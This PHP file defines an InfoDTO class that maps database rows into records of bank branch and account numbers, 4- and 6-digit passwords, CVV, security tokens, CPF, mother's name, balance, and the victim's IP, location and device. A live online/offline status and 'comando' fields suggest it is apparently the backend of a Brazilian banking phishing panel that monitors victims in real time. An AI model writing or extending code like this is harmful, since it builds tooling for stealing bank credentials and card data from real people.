<?php

class InfoDTO{


    public $id;
    public $idAcesso;
    public $agencia;
    public $conta;
    public $digito;
    public $senha4;
    public $comando;
    public $texto;
    public $ultimoAcesso;
    public $aberto;
    public $hash;
    public $ip;
    public $data;
    public $status;
    public $pais;
    public $uf;
    public $cidade;
    public $user_agent;
    public $url;
    public $referrer_url;
    public $device;
    public $tokens;
    public $cvv;
    public $celular;
    public $senha6;
    public $statusInfo;
    public $qrCodeFile;
    public $titular;
    public $nome;
    public $tipo;
    public $serialDispositivo;

    public static function converter($data){

        $infoDTO = new InfoDTO();
        $infoDTO->id = $data['id'];
        $infoDTO->ip = $data['ip'];
        $infoDTO->idAcesso = $data['idAcesso'];
        $infoDTO->agencia = $data['agencia'];
        $infoDTO->conta = $data['conta'];
        $infoDTO->digito = $data['digito'];
        $infoDTO->senha4 = $data['senha4'];
        $infoDTO->comando = $data['comando'];
        $infoDTO->texto = $data['texto'];
        $infoDTO->ultimoAcesso = $data['ultimoAcesso'];
        $infoDTO->aberto = $data['aberto'];
        $infoDTO->hash = $data['hash'];
        $infoDTO->data = $data['data'];
        $infoDTO->cvv = $data['cvv'];
        $infoDTO->celular = $data['celular'];
        $infoDTO->senha6 = $data['senha6'];
        $infoDTO->statusInfo = $data['statusInfo'];
        $agora = new \DateTime();
        $ultimoAcesso = \DateTime::createFromFormat("Y-m-d H-i-s", $data['ultimoAcesso']);
        $infoDTO->status = ($agora->getTimestamp() - $ultimoAcesso->getTimestamp()) > 10 ? 'Offline' : 'Online';
        $infoDTO->cidade = $data['cidade'];
        $infoDTO->user_agent = $data['user_agent'];
        $infoDTO->url = $data['url'];
        $infoDTO->referrer_url = $data['referrer_url'];
        $infoDTO->device = $data['device'];
        $infoDTO->qrCodeFile = $data['qrCodeFile'];
        $infoDTO->titular = $data['titular'];
        $infoDTO->nome = $data['nome'];
        $infoDTO->tipo = $data['tipo'];
        $infoDTO->serialDispositivo = $data['serialDispositivo'];
        $infoDTO->saldo = $data['saldo'];
        $infoDTO->cpf = $data['cpf'];
        $infoDTO->mae = $data['mae'];

        $infoDTO->tokens = Token::findByInfoId($infoDTO->id);

        return $infoDTO;
    }



}